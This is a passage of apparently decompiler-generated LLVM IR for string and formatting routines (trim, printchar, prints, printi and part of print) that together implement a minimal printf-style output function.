  store i32 %v6_8338, i32* @global_var_2971c.28, align 4
  br i1 true, label %dec_label_pc_83c8, label %dec_label_pc_83a8

dec_label_pc_83a8:                                ; preds = %entry
  br label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %entry, %dec_label_pc_83a8
  %v4_83e8 = mul nuw nsw i32 %v3_8300, 4
  %v5_83e8 = add i32 %v4_83e8, ptrtoint (i32* @global_var_299bc.20 to i32)
  %v6_83e8 = inttoptr i32 %v5_83e8 to i32*
  %v7_83e8 = load i32, i32* %v6_83e8, align 4
  ret i32 %v7_83e8

; uselistorder directives
  uselistorder i32 %v3_8300, { 0, 2, 1 }
  uselistorder i32* @global_var_299bc.20, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_299bc.20 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_83c8, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8428 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8448

dec_label_pc_8448:                                ; preds = %dec_label_pc_8448, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8440, %dec_label_pc_8448 ]
  %v2_8454 = add i32 %stack_var_-24.0, %tmp
  %v1_8458 = inttoptr i32 %v2_8454 to i8*
  %v2_8458 = load i8, i8* %v1_8458, align 1
  %v3_8458 = zext i8 %v2_8458 to i32
  store i32 %v3_8458, i32* %r0.global-to-local, align 4
  %v1_8460 = call i32 @isspace(i32 %v3_8458)
  store i32 %v1_8460, i32* %r0.global-to-local, align 4
  %v2_8468 = icmp eq i32 %v1_8460, 0
  %v1_8440 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8468, label %dec_label_pc_8480.preheader, label %dec_label_pc_8448

dec_label_pc_8480.preheader:                      ; preds = %dec_label_pc_8448
  %v1_8430 = add i32 %v3_8428, -1
  %v5_848c10 = icmp slt i32 %v1_8430, %stack_var_-24.0
  br i1 %v5_848c10, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8474:                                ; preds = %dec_label_pc_8490
  %v1_8478 = add i32 %stack_var_-20.011, -1
  %v5_848c = icmp slt i32 %v1_8478, %stack_var_-24.0
  br i1 %v5_848c, label %dec_label_pc_8500.preheader, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8480.preheader, %dec_label_pc_8474
  %stack_var_-20.011 = phi i32 [ %v1_8478, %dec_label_pc_8474 ], [ %v1_8430, %dec_label_pc_8480.preheader ]
  %v2_849c = add i32 %stack_var_-20.011, %tmp
  %v1_84a0 = inttoptr i32 %v2_849c to i8*
  %v2_84a0 = load i8, i8* %v1_84a0, align 1
  %v3_84a0 = zext i8 %v2_84a0 to i32
  store i32 %v3_84a0, i32* %r0.global-to-local, align 4
  %v1_84a8 = call i32 @isspace(i32 %v3_84a0)
  store i32 %v1_84a8, i32* %r0.global-to-local, align 4
  %v2_84b0 = icmp eq i32 %v1_84a8, 0
  br i1 %v2_84b0, label %dec_label_pc_8500.preheader, label %dec_label_pc_8474

dec_label_pc_8500.preheader:                      ; preds = %dec_label_pc_8474, %dec_label_pc_8490, %dec_label_pc_8480.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8430, %dec_label_pc_8480.preheader ], [ %v1_8478, %dec_label_pc_8474 ], [ %stack_var_-20.011, %dec_label_pc_8490 ]
  br label %dec_label_pc_8500

dec_label_pc_84c4:                                ; preds = %dec_label_pc_8500
  %v2_84e8 = add i32 %storemerge1, %tmp
  %v1_84ec = inttoptr i32 %v2_84e8 to i8*
  %v2_84ec = load i8, i8* %v1_84ec, align 1
  %v3_84f0 = inttoptr i32 %v2_8524 to i8*
  store i8 %v2_84ec, i8* %v3_84f0, align 1
  %v1_84f8 = add i32 %storemerge1, 1
  br label %dec_label_pc_8500

dec_label_pc_8500:                                ; preds = %dec_label_pc_8500.preheader, %dec_label_pc_84c4
  %storemerge1 = phi i32 [ %v1_84f8, %dec_label_pc_84c4 ], [ %stack_var_-24.0, %dec_label_pc_8500.preheader ]
  %v7_850c = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_8518 = sub i32 %storemerge1, %stack_var_-24.0
  %v2_8524 = add i32 %v2_8518, %tmp
  br i1 %v7_850c, label %dec_label_pc_8510, label %dec_label_pc_84c4

dec_label_pc_8510:                                ; preds = %dec_label_pc_8500
  %v3_852c = inttoptr i32 %v2_8524 to i8*
  store i8 0, i8* %v3_852c, align 1
  %v1_8538 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8538

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8430, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8500, { 1, 0 }
  uselistorder label %dec_label_pc_8500.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8490, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_853c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_853c, i32* @ip, align 4
  %v0_854c = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8558 = icmp eq i32 %v0_854c, 0
  br i1 %v2_8558, label %dec_label_pc_858c, label %dec_label_pc_8560

dec_label_pc_8560:                                ; preds = %entry
  %v1_8564 = inttoptr i32 %v0_854c to i32*
  %v2_8564 = load i32, i32* %v1_8564, align 4
  %v1_8570 = trunc i32 %arg2 to i8
  %v3_8570 = inttoptr i32 %v2_8564 to i8*
  store i8 %v1_8570, i8* %v3_8570, align 1
  %v2_8578 = load i32, i32* %v1_8564, align 4
  %v1_857c = add i32 %v2_8578, 1
  store i32 %v1_857c, i32* %v1_8564, align 4
  %v1_85a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_858c:                                ; preds = %entry
  %v2_8548 = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_859c = call i32 @__GI_write(i32 1, i32 %v2_8548)
  store i32 %v2_859c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8560, %dec_label_pc_858c
  %v1_85a8 = phi i32 [ %v1_85a8.pre, %dec_label_pc_8560 ], [ %v2_859c, %dec_label_pc_858c ]
  ret i32 %v1_85a8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_85a0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_85ac = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_85ac, i32* @ip, align 4
  %v3_85b0 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp43 = icmp slt i32 %arg3, 1
  br i1 %tmp43, label %dec_label_pc_8668, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %entry
  %v2_861820 = load i8, i8* %arg2, align 1
  %v2_861c22 = icmp eq i8 %v2_861820, 0
  br i1 %v2_861c22, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_85fc:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_85fc
  %v4_861424 = phi i32 [ %v1_860c, %dec_label_pc_85fc ], [ %tmp, %dec_label_pc_85e8 ]
  %stack_var_-40.023 = phi i32 [ %v1_8600, %dec_label_pc_85fc ], [ 0, %dec_label_pc_85e8 ]
  %v1_8600 = add i32 %stack_var_-40.023, 1
  %v1_860c = add i32 %v4_861424, 1
  %v5_8610 = inttoptr i32 %v1_860c to i8*
  %v2_8618 = load i8, i8* %v5_8610, align 1
  %v2_861c = icmp eq i8 %v2_8618, 0
  br i1 %v2_861c, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_8624:                                ; preds = %dec_label_pc_85fc, %dec_label_pc_85e8
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85e8 ], [ %v1_8600, %dec_label_pc_85fc ]
  %v5_8630 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8630, label %dec_label_pc_8640, label %dec_label_pc_8650

dec_label_pc_8640:                                ; preds = %dec_label_pc_8624
  %v2_8648 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8650

dec_label_pc_8650:                                ; preds = %dec_label_pc_8624, %dec_label_pc_8640
  %storemerge4 = phi i32 [ %v2_8648, %dec_label_pc_8640 ], [ 0, %dec_label_pc_8624 ]
  %v1_8654 = and i32 %arg4, 2
  %v2_8658 = icmp eq i32 %v1_8654, 0
  br i1 %v2_8658, label %dec_label_pc_8668, label %dec_label_pc_8660

dec_label_pc_8660:                                ; preds = %dec_label_pc_8650
  br label %dec_label_pc_8668

dec_label_pc_8668:                                ; preds = %dec_label_pc_8650, %entry, %dec_label_pc_8660
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_8650 ], [ %storemerge4, %dec_label_pc_8660 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8650 ], [ 48, %dec_label_pc_8660 ]
  %v1_866c = urem i32 %arg4, 2
  %v2_8670 = icmp eq i32 %v1_866c, 0
  br i1 %v2_8670, label %dec_label_pc_86a0.preheader, label %dec_label_pc_86dc.preheader

dec_label_pc_86a0.preheader:                      ; preds = %dec_label_pc_8668
  %v5_86a817 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_86a817, label %dec_label_pc_867c.lr.ph, label %dec_label_pc_86dc.preheader

dec_label_pc_867c.lr.ph:                          ; preds = %dec_label_pc_86a0.preheader
  %v2_8684 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_867c

dec_label_pc_867c:                                ; preds = %dec_label_pc_867c.lr.ph, %dec_label_pc_867c
  %stack_var_-28.118 = phi i32 [ %stack_var_-28.0, %dec_label_pc_867c.lr.ph ], [ %v1_8698, %dec_label_pc_867c ]
  %v3_8684 = call i32 @printchar(i32* %v2_8684, i32 %stack_var_-44.0)
  %v3_8688 = load i32, i32* %stack_var_-48, align 4
  %v1_868c = add i32 %v3_8688, 1
  store i32 %v1_868c, i32* %stack_var_-48, align 4
  %v1_8698 = add nsw i32 %stack_var_-28.118, -1
  %v5_86a8 = icmp sgt i32 %stack_var_-28.118, 1
  br i1 %v5_86a8, label %dec_label_pc_867c, label %dec_label_pc_86dc.preheader

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_867c, %dec_label_pc_86a0.preheader, %dec_label_pc_8668
  %v3_872028 = phi i32 [ 0, %dec_label_pc_8668 ], [ 0, %dec_label_pc_86a0.preheader ], [ %v1_868c, %dec_label_pc_867c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8668 ], [ %stack_var_-28.0, %dec_label_pc_86a0.preheader ], [ 0, %dec_label_pc_867c ]
  %v2_86e010 = load i8, i8* %arg2, align 1
  %v2_86e412 = icmp eq i8 %v2_86e010, 0
  br i1 %v2_86e412, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0.lr.ph

dec_label_pc_86b0.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b0

dec_label_pc_86b0:                                ; preds = %dec_label_pc_86b0.lr.ph, %dec_label_pc_86b0
  %v4_86dc14 = phi i32 [ %tmp, %dec_label_pc_86b0.lr.ph ], [ %v1_86d4, %dec_label_pc_86b0 ]
  %stack_var_-24.013 = phi i8* [ %arg2, %dec_label_pc_86b0.lr.ph ], [ %v5_86d8, %dec_label_pc_86b0 ]
  %v2_86b4 = load i8, i8* %stack_var_-24.013, align 1
  %v3_86b4 = zext i8 %v2_86b4 to i32
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %v3_86b4)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add i32 %v4_86dc14, 1
  %v5_86d8 = inttoptr i32 %v1_86d4 to i8*
  %v2_86e0 = load i8, i8* %v5_86d8, align 1
  %v2_86e4 = icmp eq i8 %v2_86e0, 0
  br i1 %v2_86e4, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0

dec_label_pc_8714.preheader:                      ; preds = %dec_label_pc_86b0, %dec_label_pc_86dc.preheader
  %v3_872027 = phi i32 [ %v3_872028, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b0 ]
  %v5_871c7 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_871c7, label %dec_label_pc_86f0.lr.ph, label %dec_label_pc_8720

dec_label_pc_86f0.lr.ph:                          ; preds = %dec_label_pc_8714.preheader
  %v2_86f8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86f0

dec_label_pc_86f0:                                ; preds = %dec_label_pc_86f0.lr.ph, %dec_label_pc_86f0
  %stack_var_-28.38 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86f0.lr.ph ], [ %v1_870c, %dec_label_pc_86f0 ]
  %v3_86f8 = call i32 @printchar(i32* %v2_86f8, i32 %stack_var_-44.0)
  %v3_86fc = load i32, i32* %stack_var_-48, align 4
  %v1_8700 = add i32 %v3_86fc, 1
  store i32 %v1_8700, i32* %stack_var_-48, align 4
  %v1_870c = add nsw i32 %stack_var_-28.38, -1
  %v5_871c = icmp sgt i32 %stack_var_-28.38, 1
  br i1 %v5_871c, label %dec_label_pc_86f0, label %dec_label_pc_8720

dec_label_pc_8720:                                ; preds = %dec_label_pc_86f0, %dec_label_pc_8714.preheader
  %v3_8720 = phi i32 [ %v3_872027, %dec_label_pc_8714.preheader ], [ %v1_8700, %dec_label_pc_86f0 ]
  store i32 %v3_85b0, i32* @fp, align 4
  ret i32 %v3_8720

; uselistorder directives
  uselistorder i32 %v1_86d4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_860c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86f0, { 1, 0 }
  uselistorder label %dec_label_pc_86b0, { 1, 0 }
  uselistorder label %dec_label_pc_867c, { 1, 0 }
  uselistorder label %dec_label_pc_8668, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8650, { 1, 0 }
  uselistorder label %dec_label_pc_85fc, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8738 = load i32, i32* @fp, align 4
  store i32 34624, i32* %stack_var_-4, align 4
  %v2_873c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_873c, i32* @fp, align 4
  %v1_8770 = icmp slt i32 %arg2, 0
  %v2_8770 = icmp eq i32 %arg2, 0
  br i1 %v2_8770, label %dec_label_pc_8778, label %dec_label_pc_87ac

dec_label_pc_8778:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_879c = bitcast i32* %stack_var_-28 to i8*
  %v6_879c = call i32 @prints(i32 %arg1, i8* %v5_879c, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_890c

dec_label_pc_87ac:                                ; preds = %entry
  %v2_87b0 = icmp eq i32 %arg4, 0
  br i1 %v2_87b0, label %dec_label_pc_87e4, label %dec_label_pc_87b8

dec_label_pc_87b8:                                ; preds = %dec_label_pc_87ac
  %v7_87bc = icmp eq i32 %arg3, 10
  br i1 %v7_87bc, label %dec_label_pc_87c4, label %dec_label_pc_87e4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87b8
  br i1 %v1_8770, label %dec_label_pc_87d0, label %dec_label_pc_87e4

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87c4
  %v1_87dc = sub i32 0, %arg2
  br label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87b8, %dec_label_pc_87ac, %dec_label_pc_87d0
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_87ac ], [ %v1_87dc, %dec_label_pc_87d0 ], [ %arg2, %dec_label_pc_87c4 ], [ %arg2, %dec_label_pc_87b8 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_87ac ], [ 1, %dec_label_pc_87d0 ], [ 0, %dec_label_pc_87c4 ], [ 0, %dec_label_pc_87b8 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_88784 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_88784, label %dec_label_pc_8880, label %dec_label_pc_8800.lr.ph

dec_label_pc_8800.lr.ph:                          ; preds = %dec_label_pc_87e4
  %v1_8828 = add i32 %arg7, -58
  br label %dec_label_pc_8800

dec_label_pc_8800:                                ; preds = %dec_label_pc_8800.lr.ph, %dec_label_pc_8838
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8800.lr.ph ], [ %v2_880c, %dec_label_pc_8838 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8800.lr.ph ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_880c = udiv i32 %stack_var_-52.16, %arg3
  %v3_880c = urem i32 %stack_var_-52.16, %arg3
  %v7_8820 = icmp slt i32 %v3_880c, 10
  br i1 %v7_8820, label %dec_label_pc_8838, label %dec_label_pc_8824

dec_label_pc_8824:                                ; preds = %dec_label_pc_8800
  %v2_8830 = add i32 %v3_880c, %v1_8828
  br label %dec_label_pc_8838

dec_label_pc_8838:                                ; preds = %dec_label_pc_8800, %dec_label_pc_8824
  %stack_var_-64.0 = phi i32 [ %v3_880c, %dec_label_pc_8800 ], [ %v2_8830, %dec_label_pc_8824 ]
  %v4_8838 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_883c = add i32 %v4_8838, -1
  %v5_8840 = inttoptr i32 %v1_883c to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_8858 = trunc i32 %fold to i8
  store i8 %v1_8858, i8* %v5_8840, align 1
  %v2_8878 = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_8878, label %dec_label_pc_8880, label %dec_label_pc_8800

dec_label_pc_8880:                                ; preds = %dec_label_pc_8838, %dec_label_pc_87e4
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87e4 ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_8884 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_8884, label %dec_label_pc_88e8, label %dec_label_pc_888c

dec_label_pc_888c:                                ; preds = %dec_label_pc_8880
  %v3_888c = load i32, i32* %stack_var_0, align 4
  %v2_8890 = icmp eq i32 %v3_888c, 0
  br i1 %v2_8890, label %dec_label_pc_88d0, label %dec_label_pc_8898

dec_label_pc_8898:                                ; preds = %dec_label_pc_888c
  %v1_889c = and i32 %arg6, 2
  %v2_88a0 = icmp eq i32 %v1_889c, 0
  br i1 %v2_88a0, label %dec_label_pc_88d0, label %dec_label_pc_88a8

dec_label_pc_88a8:                                ; preds = %dec_label_pc_8898
  %v2_88b0 = inttoptr i32 %arg1 to i32*
  %v3_88b0 = call i32 @printchar(i32* %v2_88b0, i32 45)
  %v3_88c0 = load i32, i32* %stack_var_0, align 4
  %v1_88c4 = add i32 %v3_88c0, -1
  store i32 %v1_88c4, i32* %stack_var_0, align 4
  br label %dec_label_pc_88e8

dec_label_pc_88d0:                                ; preds = %dec_label_pc_8898, %dec_label_pc_888c
  %v4_88d0 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_88d4 = add i32 %v4_88d0, -1
  %v5_88d8 = inttoptr i32 %v1_88d4 to i8*
  store i8 45, i8* %v5_88d8, align 1
  br label %dec_label_pc_88e8

dec_label_pc_88e8:                                ; preds = %dec_label_pc_8880, %dec_label_pc_88a8, %dec_label_pc_88d0
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_8880 ], [ %v5_88d8, %dec_label_pc_88d0 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_88a8 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8880 ], [ 0, %dec_label_pc_88d0 ], [ 1, %dec_label_pc_88a8 ]
  %v3_88f0 = load i32, i32* %stack_var_0, align 4
  %v6_88f8 = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_88f0, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8904 = add i32 %v6_88f8, %stack_var_-56.0
  br label %dec_label_pc_890c

dec_label_pc_890c:                                ; preds = %dec_label_pc_8778, %dec_label_pc_88e8
  %storemerge2 = phi i32 [ %v2_8904, %dec_label_pc_88e8 ], [ %v6_879c, %dec_label_pc_8778 ]
  store i32 %v3_8738, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8840, { 0, 2, 1 }
  uselistorder i32 %v3_880c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_890c, { 1, 0 }
  uselistorder label %dec_label_pc_88e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8838, { 1, 0 }
  uselistorder label %dec_label_pc_8800, { 1, 0 }
  uselistorder label %dec_label_pc_87e4, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8920 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8920, i32* @ip, align 4
  store i32 35116, i32* %stack_var_-4, align 4
  %v2_8928 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8928, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8cd429 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8cd831 = icmp eq i8 %v2_8cd429, 0
  br i1 %v2_8cd831, label %dec_label_pc_8ce0, label %dec_label_pc_8948.lr.ph

dec_label_pc_8948.lr.ph:                          ; preds = %entry
  %v5_8c8c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8948

dec_label_pc_8948:                                ; preds = %dec_label_pc_8948.lr.ph, %dec_label_pc_8cc4
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8948.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8cc4 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8948.lr.ph ], [ %v1_8cc8, %dec_label_pc_8cc4 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8948.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8cc4 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8948.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_894c = load i8, i8* %stack_var_-32.435, align 1
  %v7_8950 = icmp eq i8 %v2_894c, 37
  br i1 %v7_8950, label %dec_label_pc_8958, label %dec_label_pc_8ca4

dec_label_pc_8958:                                ; preds = %dec_label_pc_8948
  %v1_895c = add i32 %stack_var_-32.4.in34, 1
  %v5_8960 = inttoptr i32 %v1_895c to i8*
  %v2_8978 = load i8, i8* %v5_8960, align 1
  %v2_897c = icmp eq i8 %v2_8978, 0
  br i1 %v2_897c, label %dec_label_pc_8ce0, label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8958
  %v2_8988 = load i8, i8* %v5_8960, align 1
  %v7_898c = icmp eq i8 %v2_8988, 37
  br i1 %v7_898c, label %dec_label_pc_8ca4, label %dec_label_pc_8994

dec_label_pc_8994:                                ; preds = %dec_label_pc_8984
  %v2_8998 = load i8, i8* %v5_8960, align 1
  %v7_899c = icmp eq i8 %v2_8998, 45
  br i1 %v7_899c, label %dec_label_pc_89a4, label %dec_label_pc_89d4.preheader

dec_label_pc_89a4:                                ; preds = %dec_label_pc_8994
  %v1_89a8 = add i32 %stack_var_-32.4.in34, 2
  %v5_89ac = inttoptr i32 %v1_89a8 to i8*
  br label %dec_label_pc_89d4.preheader

dec_label_pc_89d4.preheader:                      ; preds = %dec_label_pc_89a4, %dec_label_pc_8994
  %stack_var_-32.0.ph = phi i8* [ %v5_8960, %dec_label_pc_8994 ], [ %v5_89ac, %dec_label_pc_89a4 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8994 ], [ 1, %dec_label_pc_89a4 ]
  %v4_89d42 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_89d83 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_89dc7 = icmp eq i8 %v2_89d83, 48
  br i1 %v7_89dc7, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_89bc:                                ; preds = %dec_label_pc_89d4.preheader, %dec_label_pc_89bc
  %v4_89d49 = phi i32 [ %v1_89c0, %dec_label_pc_89bc ], [ %v4_89d42, %dec_label_pc_89d4.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_89cc, %dec_label_pc_89bc ], [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ]
  %v1_89c0 = add i32 %v4_89d49, 1
  %v5_89c4 = inttoptr i32 %v1_89c0 to i8*
  %v1_89cc = or i32 %stack_var_-48.08, 2
  %v2_89d8 = load i8, i8* %v5_89c4, align 1
  %v7_89dc = icmp eq i8 %v2_89d8, 48
  br i1 %v7_89dc, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_8a20.preheader:                      ; preds = %dec_label_pc_89bc, %dec_label_pc_89d4.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ], [ %v1_89cc, %dec_label_pc_89bc ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_89d4.preheader ], [ %v5_89c4, %dec_label_pc_89bc ]
  %v4_8a2011 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8a2412 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8a2412, 48
  br i1 %tmp60, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_89e8:                                ; preds = %dec_label_pc_8a30
  %v2_89f4 = mul i32 %stack_var_-52.019, 10
  %v2_8a00 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8a00 = zext i8 %v2_8a00 to i32
  %v1_8a04 = add i32 %v2_89f4, -48
  %v2_8a0c = add i32 %v1_8a04, %v3_8a00
  %v1_8a18 = add i32 %v4_8a2021, 1
  %v5_8a1c = inttoptr i32 %v1_8a18 to i8*
  %v2_8a24 = load i8, i8* %v5_8a1c, align 1
  %tmp61 = icmp ult i8 %v2_8a24, 48
  br i1 %tmp61, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_8a30:                                ; preds = %dec_label_pc_8a20.preheader, %dec_label_pc_89e8
  %v4_8a2021 = phi i32 [ %v1_8a18, %dec_label_pc_89e8 ], [ %v4_8a2011, %dec_label_pc_8a20.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8a0c, %dec_label_pc_89e8 ], [ 0, %dec_label_pc_8a20.preheader ]
  %v2_8a34 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8a34, 58
  br i1 %tmp62, label %dec_label_pc_89e8, label %dec_label_pc_8a40

